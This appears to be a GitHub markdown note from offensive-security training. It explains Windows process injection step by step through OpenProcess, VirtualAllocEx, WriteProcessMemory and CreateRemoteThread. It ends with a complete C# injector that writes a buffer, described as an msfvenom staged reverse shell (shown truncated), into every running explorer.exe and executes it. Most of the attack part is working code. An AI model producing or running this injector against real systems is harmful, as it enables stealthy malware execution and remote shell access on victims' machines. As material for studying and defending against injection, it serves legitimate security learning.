<img width="1303" height="692" alt="image" src="https://github.com/user-attachments/assets/8c9b2509-cacf-419b-8ca8-d195c7e68c4b" />



##### we can initiate Windows-based process injection by opening a channel from one process to another. Process must be running at same integrity level or lower.    

1. Use Win32 **OpenProcess** API to open a channel. 
2. We'll then modify its memory space through the **VirtualAllocEx** and **WriteProcessMemory** APIs  
3. create a new execution thread inside the remote process with **CreateRemoteThread**.  
<br>
<br>
<br>

STEP #1 [OpenProcess API](http://pinvoke.net/default.aspx/kernel32/OpenProcess.html) has three arguments. Desired access listed on pinvoke webpage  
1. dwDesiredAccess, establishes the access rights we require on that process.  
2. bInheritHandle, determines if the returned handle may be inherited by a child process   
3. dwProcessId, specifies the process identifier of the target process. 
<br>
<br>
<br>


STEP #2 [VirtualAllocEx API](http://pinvoke.net/default.aspx/kernel32/VirtualAllocEx.html)  

[VirtualAllocEx MS page with function prototype](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) 


The first argument (hProcess) is the process handle to explorer.exe that we just obtained from OpenProcess and the second, lpAddress, is the desired address of the allocation in the remote process. If the API succeeds, our new buffer will be allocated with a starting address as supplied in lpAddress.

If the address given with lpAddress is already allocated and in use, the call will fail. It is better to pass a null value and let the API select an unused address.

The last three arguments (dwSize, flAllocationType, and flProtect) mirror the VirtualAlloc API parameters and specify the size of the desired allocation, the allocation type, and the memory protections. We'll set these to 0x1000, 0x3000 (MEM_COMMIT and MEM_RESERVE) and 0x40 (PAGE_EXECUTE_READWRITE), respectively. The VirtualAllocEx invocation is shown below.


<br>
<br>
<br>

STEP #3 [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
<br>
ProtoType:
<br>
We first pass the process handle (hProcess), followed by the newly allocated memory address (lpBaseAddress) in explorer.exe, along with the address of the byte array (lpBuffer) containing the shellcode. The remaining two arguments are the size of the shellcode to be copied (nSize) and a pointer to a location in memory (lpNumberOfBytesWritten) to output how much data was copied.   
<br>

for the word **OUT** in the script below on writeprocessmemory
<br>
We'll observe that the out keyword was prepended to the outSize variable to have it passed by reference instead of value.  
<br>

```C
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```
<br>
<br>
<br>
<br>

STEP #4 [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
<br>
<br>

CreateRemoteThread Prototype:  
<br>

```C
HANDLE CreateRemoteThread(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
```
<br>


This API accepts seven arguments, but we will ignore those that aren't required. The first argument is the process handle to explorer.exe, followed by the desired security descriptor of the new thread (lpThreadAttributes) and its allowed stack size (dwStackSize). We will set these to "0" to accept the default values.

For the fourth argument, lpStartAddress, we must specify the starting address of the thread. In our case, it must be equal to the address of the buffer we allocated and copied our shellcode into inside the explorer.exe process. The next argument, lpParameter, is a pointer to variables which will be passed to the thread function pointed to by lpStartAddress. Since our shellcode does not need any parameters, we can pass a NULL here.

The remaining two arguments include various flags (dwCreationFlags) and an output variable for a thread ID (lpThreadId), both of which we will ignore.   
<br><br><br>
<br><br><br>


**REMEMBER TO ALWAYS COMPILE IN FOR THE RIGHT ARCHITECHTURE!  X64 or X86.....**

Final C# script to inject into explorer.exe found by name.  If there are multiple explorer.exe running this will inject into all of them.  Correct script to point to 0 in explorerprocess array for first instance of explorer.exe  <br><br>
```C#
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace inject
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
            IntPtr hProcess = 0;

            Process[] explorerprocess = Process.GetProcessesByName("explorer");
            foreach (Process proc in explorerprocess)
            {
                Console.WriteLine("Found explorer at PID: " + proc.Id);
                
                hProcess = OpenProcess(0x001F0FFF, false, proc.Id);

                //IntPtr hProcess = OpenProcess(0x001F0FFF, false, 6608);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

		//buf is msfvenom csharp staged rev shell.
                byte[] buf = new byte[750] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51};

                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
    }
}


```
